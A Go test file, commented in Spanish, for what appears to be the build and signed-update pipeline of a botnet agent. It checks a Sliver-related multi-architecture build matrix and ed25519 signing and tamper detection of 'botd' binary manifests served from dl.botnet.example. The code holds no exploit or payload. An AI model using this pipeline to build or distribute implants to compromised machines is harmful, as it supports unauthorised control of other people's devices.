package main

import (
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/botnet/botnet/internal/agent"
)

// T-1401: el profiles.yaml del repo debe declarar la matriz exacta de 6
// archs con los topes por clase del BLUEPRINT §2.
func TestRepoProfilesDeclareFullMatrix(t *testing.T) {
	ps, err := LoadProfiles(filepath.Join("..", "..", "deploy", "sliver-builder", "profiles.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	if err := ValidateProfiles(ps); err != nil {
		t.Fatal(err)
	}
}

func TestValidateProfilesRejectsDrift(t *testing.T) {
	ps, err := LoadProfiles(filepath.Join("..", "..", "deploy", "sliver-builder", "profiles.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	for i := range ps {
		if ps[i].GOARCH == "mips" {
			ps[i].MaxBytes = 3000000
		}
	}
	if err := ValidateProfiles(ps); err == nil {
		t.Fatal("tope alterado debe invalidar la matriz")
	}
	if err := ValidateProfiles(ps[:5]); err == nil {
		t.Fatal("5 perfiles (matriz incompleta) deben invalidar")
	}
}

// T-1403 e2e con las mismas funciones que invocan los scripts: genroot ->
// sign -> verify OK; alterar el sig del manifest en disco -> verify falla.
func TestGenrootSignVerifyTamper(t *testing.T) {
	keydir := t.TempDir()
	dist := t.TempDir()
	for _, tag := range []string{"amd64", "mipsbe"} {
		if err := os.WriteFile(filepath.Join(dist, "botd-"+tag),
			[]byte("elf "+tag), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := cmdGenroot(keydir); err != nil {
		t.Fatal(err)
	}
	if err := cmdGenroot(keydir); err == nil {
		t.Fatal("genroot no debe pisar una raiz existente")
	}
	manifest := filepath.Join(dist, "manifest.json")
	if err := cmdSign(dist, keydir, manifest, "https://dl.botnet.example/{version}/{file}", "9.9.9"); err != nil {
		t.Fatal(err)
	}
	rootPub := filepath.Join(keydir, "root_ed25519.pub")
	if err := cmdVerify(manifest, rootPub, dist); err != nil {
		t.Fatalf("verify limpio: %v", err)
	}
	// Alteracion de 1 byte del sig en el manifest.json de disco.
	raw, err := os.ReadFile(manifest)
	if err != nil {
		t.Fatal(err)
	}
	var m agent.Manifest
	if err := json.Unmarshal(raw, &m); err != nil {
		t.Fatal(err)
	}
	sig, err := base64.StdEncoding.DecodeString(m.Entries[0].Sig)
	if err != nil {
		t.Fatal(err)
	}
	sig[10] ^= 0x01
	m.Entries[0].Sig = base64.StdEncoding.EncodeToString(sig)
	out, err := json.Marshal(&m)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(manifest, out, 0o644); err != nil {
		t.Fatal(err)
	}
	err = cmdVerify(manifest, rootPub, dist)
	if err == nil || !strings.Contains(err.Error(), "rejected_sig") {
		t.Fatalf("sig alterado: err %v, want rejected_sig", err)
	}
}

// print-root usa la raiz compilada: con el flag -X el valor impreso coincide
// con la pubkey publicada (assert byte a byte).
func TestPrintRootMatchesCompiledVar(t *testing.T) {
	old := agent.RootPubKeyBase64
	t.Cleanup(func() { agent.RootPubKeyBase64 = old })
	agent.RootPubKeyBase64 = "Q1J6a2V5TW9ja0NvbXBpbGVkMTIzNDU2Nzg5QUJDREVGRw=="
	if got := agent.PrintRoot(); got != agent.RootPubKeyBase64 {
		t.Fatalf("print-root %q != var compilada", got)
	}
}
